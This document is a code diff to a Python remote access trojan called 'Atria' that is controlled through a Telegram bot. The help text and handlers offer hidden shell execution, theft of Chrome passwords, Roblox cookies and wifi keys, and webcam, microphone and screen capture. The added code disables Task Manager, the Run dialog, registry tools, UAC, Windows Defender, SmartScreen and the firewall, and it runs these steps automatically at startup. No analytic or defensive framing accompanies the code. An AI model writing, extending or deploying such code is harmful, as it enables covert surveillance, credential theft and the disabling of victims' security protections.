@@ -125,25 +125,28 @@ def send_help(message):
         "Atria Commands\n"
         "/help - List available commands\n"
         "/screenshot - Capture and send a screenshot\n"
-        "/upload - Upload file from users's PC (not yet finished)\n"
+        "/upload - Upload file from users's PC\n"
         "/download <filename> - Download file from user's PC\n"
         "/shell <command> - Execute commands using a hidden shell\n"
         "/users - Shows all users in the user's PC\n"
         "/passwords - Decrypt passwords saved in Chrome and sends to the bot\n"
-        "/screenrecord <time in seconds> - Records the screen in x seconds\n"
+        "/screenrecord <seconds> - Records the screen in x seconds\n"
         "/hide - Hides the compiled python script using hidden attribute\n"
         "/shutdown - Shuts down user's PC\n"
         "/restart - Restarts user's PC\n"
         "/tasklist - Shows running processes\n"
-        "taskkill - Kills specific processes\n"
-        "/mic <time in seconds> - Records mic audio in x seconds\n"
+        "/taskkill - Kills specific processes\n"
+        "/mic <seconds> - Records mic audio in x seconds\n"
         "/webscreenshot - Takes a picture in the webcam\n"
         "/info - Shows currently PC info (ip address, etc)\n"
         "/whoami - Shows the currently logged on user\n"
         "/robloxcookie - Gets the roblox cookie and sends to the bot\n"
-        "/webcam <time in seconds> - Records the webcam in x seconds\n"
+        "/webcam <seconds> - Records the webcam in x seconds\n"
         "/wifilist - Shows all saved wifi networks\n"
-        "/wifipass - Shows all wifi passwords for all saved wifi networks"
+        "/wifipass - Shows all wifi passwords for all saved wifi networks\n"
+        "/dtaskmgr - Disables task manager\n"
+        "/drun - Disables run command\n"
+        "/dregistry - Disables registry tools"
     )
     bot.send_message(message.chat.id, help_message)
 
@@ -412,9 +415,10 @@ def screen(message):
 @bot.message_handler(commands=['hide'])
 def hide(message):
     try:
-        full_path = os.path.abspath(__file__)
-        bot.send_message(message.chat.id, f'Full path: {full_path}')
-        os.popen(f'attrib +h "{full_path}"')
+        exe_path = sys.executable
+        bot.send_message(message.chat.id, f'Full path: {exe_path}')
+        
+        os.popen(f'attrib +h "{exe_path}"')
 
         bot.send_message(message.chat.id, 'Your app is now hidden!')
     except Exception as e:
@@ -443,18 +447,27 @@ def restart_command(message):
 def command_execution(message):
     try:
         MAX_MESSAGE_LENGTH = 4096
-        
+
         tasklist_res = os.popen('tasklist').read().strip()
-        tasklist_chunks = [tasklist_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(tasklist_res), MAX_MESSAGE_LENGTH)]
+        task_lines = tasklist_res.splitlines()[3:]
+        process_info = []
+        seen_apps = set()
 
-        for chunk in tasklist_chunks:
-            bot.send_message(message.chat.id, f"Tasklist Result:\n\n{chunk}")
+        for line in task_lines:
+            parts = line.split()
+            if len(parts) >= 2:
+                app_name = parts[0]
+                pid = parts[1]
 
-        wmic_res = os.popen('wmic process get description').read().strip()
-        wmic_chunks = [wmic_res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(wmic_res), MAX_MESSAGE_LENGTH)]
+                if app_name not in seen_apps:
+                    process_info.append(f"App: {app_name}, PID: {pid}")
+                    seen_apps.add(app_name)
 
-        for chunk in wmic_chunks:
-            bot.send_message(message.chat.id, f"Process Descriptions:\n\n{chunk}")
+        process_info_str = "\n".join(process_info)
+        process_chunks = [process_info_str[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(process_info_str), MAX_MESSAGE_LENGTH)]
+
+        for chunk in process_chunks:
+            bot.send_message(message.chat.id, f"Tasklist (Main App Name & PID):\n\n{chunk}")
 
     except Exception as e:
         bot.send_message(message.chat.id, f"Error:\n\n{e}")
@@ -579,11 +592,31 @@ def information(message):
         ip_info = "\n".join(f"{label}: {fetch_ip_info(endpoint)}" for endpoint, label in endpoints.items())
         bot.send_message(message.chat.id, ip_info)
 
-        system_info = os.popen('wmic os get /format:list').read().strip()
-        bot.send_message(message.chat.id, f"\nSystem Information:\n{system_info}")
+        system_info_raw = os.popen('wmic os get /format:list').read().strip()
+        useful_info = extract_useful_system_info(system_info_raw)
+
+        bot.send_message(message.chat.id, f"\nSystem Information:\n{useful_info}")
 
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
+
+# Extract and filter useful system info
+def extract_useful_system_info(system_info):
+    useful_keys = [
+        "Caption", "OSArchitecture", "Version", "BuildNumber", "SerialNumber", 
+        "TotalVisibleMemorySize", "FreePhysicalMemory", "InstallDate", "LastBootUpTime", 
+        "SystemDrive", "WindowsDirectory", "SystemDirectory", "NumberOfProcesses"
+    ]
+
+    lines = system_info.split("\n")
+    useful_info = []
+
+    for line in lines:
+        key, value = line.split('=', 1) if '=' in line else (None, None)
+        if key and key.strip() in useful_keys:
+            useful_info.append(line)
+
+    return "\n".join(useful_info)
 
 # Show current user name
 @bot.message_handler(commands=['whoami'])
@@ -713,6 +746,93 @@ def get_wifi_password(message):
     except Exception as e:
         bot.send_message(message.chat.id, f'Error: {e}')
 
+# Disable Task Manager
+@bot.message_handler(commands=['dtaskmgr'])
+def handle_disable_task_manager(message):
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "DisableTaskMgr")
+            if value == 1:
+                bot.reply_to(message, "Task Manager is already disabled.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            bot.reply_to(message, "Task Manager has been disabled.")
+    except Exception as e:
+        bot.reply_to(message, f"An error occurred: {e}")
+
+    winreg.CloseKey(reg_key)
+
+# Disable Run command
+@bot.message_handler(commands=['drun'])
+def handle_disable_run_command(message):
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_READ | winreg.KEY_WRITE)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "NoRun")
+            if value == 1:
+                bot.reply_to(message, "Run command is already disabled.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            bot.reply_to(message, "Run command has been disabled.")
+    except Exception as e:
+        bot.reply_to(message, f"An error occurred: {e}")
+
+    winreg.CloseKey(reg_key)
+
+# Disable Registry Tools
+@bot.message_handler(commands=['dregistry'])
+def handle_disable_registry_tools(message):
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "DisableRegistryTools")
+            if value == 1:
+                bot.reply_to(message, "Registry Editor is already disabled.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            bot.reply_to(message, "Registry Editor has been disabled.")
+    except Exception as e:
+        bot.reply_to(message, f"An error occurred: {e}")
+
+    winreg.CloseKey(reg_key)
+
 # Continuation of Keylogger Functions
 # Get path to Driver directory
 def get_app_dir():
@@ -824,52 +944,184 @@ def run_as_admin():
 
 # Disable UAC by modifying registry
 def disable_uac():
-    reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
 
     try:
-        value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
-        if value > 0:
-            command = r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-            if ret < 32:
-                raise ctypes.WinError(ctypes.get_last_error())
-    except FileNotFoundError:
-        pass
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
+            if value == 0:
+                print("UAC is already disabled.")
+                return
+        except FileNotFoundError:
+            pass
 
-    winreg.CloseKey(reg_key)
-
-# Disable Task Manager by modifying registry
-def disable_task_manager():
-    try:
-        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
-    except FileNotFoundError:
-        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-
-    try:
-        value, _ = winreg.QueryValueEx(reg_key, "DisableTaskMgr")
-
-        if value == 1:
-            print("Task Manager is already disabled.")
-        else:
-            command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
-            shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-            ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-            if ret < 32:
-                raise ctypes.WinError(ctypes.get_last_error())
-            else:
-                print("Task Manager has been disabled.")
-    except FileNotFoundError:
-        command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+        command = r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
         shell32 = ctypes.WinDLL('shell32', use_last_error=True)
         ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
         if ret < 32:
             raise ctypes.WinError(ctypes.get_last_error())
         else:
-            print("Task Manager has been disabled.")
-    
-    # Close the registry key
+            print("UAC has been disabled.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
     winreg.CloseKey(reg_key)
+
+# Disable UAC admin prompt by modifying registry
+def disable_uac_prompt():
+    try:
+        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "ConsentPromptBehaviorAdmin")
+            if value == 0:
+                print("UAC prompt behavior for administrators is already set to 'Never notify'.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            print("UAC prompt behavior for administrators has been disabled.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    
+    winreg.CloseKey(reg_key)
+
+# Suppress Defender Notifications by modifying registry
+def suppress_windows_defender_notifications():
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows Defender\UX Configuration", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows Defender\UX Configuration")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "Notification_Suppress")
+            if value == 1:
+                print("Windows Defender notifications are already suppressed.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            print("Windows Defender notifications have been suppressed.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    winreg.CloseKey(reg_key)
+
+# Disable Defender Real-Time Protection by modifying registry
+def disable_defender_realtime_protection():
+    try:
+        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
+    except FileNotFoundError:
+        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
+
+    try:
+        try:
+            value, _ = winreg.QueryValueEx(reg_key, "DisableRealtimeMonitoring")
+            if value == 1:
+                print("Real-time protection is already disabled.")
+                return
+        except FileNotFoundError:
+            pass
+
+        command = r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
+        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
+        if ret < 32:
+            raise ctypes.WinError(ctypes.get_last_error())
+        else:
+            print("Real-time protection has been disabled.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    winreg.CloseKey(reg_key)
+
+# Disable startup, stop and delete WinDefend
+def manage_windows_defender():
+    try:
+        subprocess.run(["sc", "config", "WinDefend", "start= disabled"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        print("Successfully disabled start-up for WinDefend.")
+
+        subprocess.run(["sc", "stop", "WinDefend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        print("Successfully stopped WinDefend.")
+
+        subprocess.run(["sc", "delete", "WinDefend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+        print("Successfully deleted WinDefend.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred: {e}")
+
+# Change permission, kill and delete smartscreen
+def manage_smartscreen():
+    try:
+        subprocess.run(
+            ["takeown", "/f", r"%systemroot%\System32\smartscreen.exe", "/a"],
+            check=True
+        )
+        print("Ownership was changed to Administrators.")
+
+        subprocess.run(
+            ["icacls", r"%systemroot%\System32\smartscreen.exe", "/grant:r", "Administrators:F", "/c"],
+            check=True
+        )
+        print("Administrators has granted Full Control permissions.")
+
+        subprocess.run(
+            ["taskkill", "/im", "smartscreen.exe", "/f"],
+            check=True
+        )
+        print("smartscreen.exe killed successfully.")
+
+        subprocess.run(
+            ["del", r"%systemroot%\System32\smartscreen.exe", "/s", "/f", "/q"],
+            check=True
+        )
+        print("smartscreen.exe deleted successfully.")
+
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred: {e}")
+
+# Disable Windows Security Core Protections
+def configure_windows_security():
+    commands = [
+        "powershell.exe -command \"Add-MpPreference -ExclusionExtension '*'\"",
+        "powershell.exe -command \"Set-MpPreference -EnableControlledFolderAccess Disabled\"",
+        "powershell.exe -command \"Set-MpPreference -PUAProtection disable\"",
+        "powershell.exe -command \"Set-MpPreference -HighThreatDefaultAction 6 -Force\"",
+        "powershell.exe -command \"Set-MpPreference -ModerateThreatDefaultAction 6 -Force\"",
+        "powershell.exe -command \"Set-MpPreference -LowThreatDefaultAction 6 -Force\"",
+        "powershell.exe -command \"Set-MpPreference -SevereThreatDefaultAction 6 -Force\"",
+        "powershell.exe -command \"Set-MpPreference -ScanScheduleDay 8\"",
+        "powershell.exe -command \"netsh advfirewall set allprofiles state off\"",
+        "powershell.exe -command \"Set-MpPreference -MAPSReporting 0\"",
+        "powershell.exe -command \"Set-MpPreference -SubmitSamplesConsent 2\"",
+        "powershell.exe -command \"& {Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0';}\""
+    ]
+
+    for command in commands:
+        try:
+            subprocess.run(command, shell=True, check=True)
+            print(f"Successfully executed: {command}")
+        except subprocess.CalledProcessError as e:
+            print(f"An error occurred while executing: {command}")
+            print(f"Error: {e}")
 
 # Check if a scheduled task exists
 def task_exists(task_name):
@@ -976,7 +1228,12 @@ if __name__ == '__main__':
 
         time.sleep(2)
         disable_uac()
-        time.sleep(2)
+        disable_uac_prompt()
+        disable_defender_realtime_protection()
+        manage_windows_defender()
+        manage_smartscreen()
+        configure_windows_security()
+        suppress_windows_defender_notifications()
         add_to_startup()
 
         session_files = create_session_files()
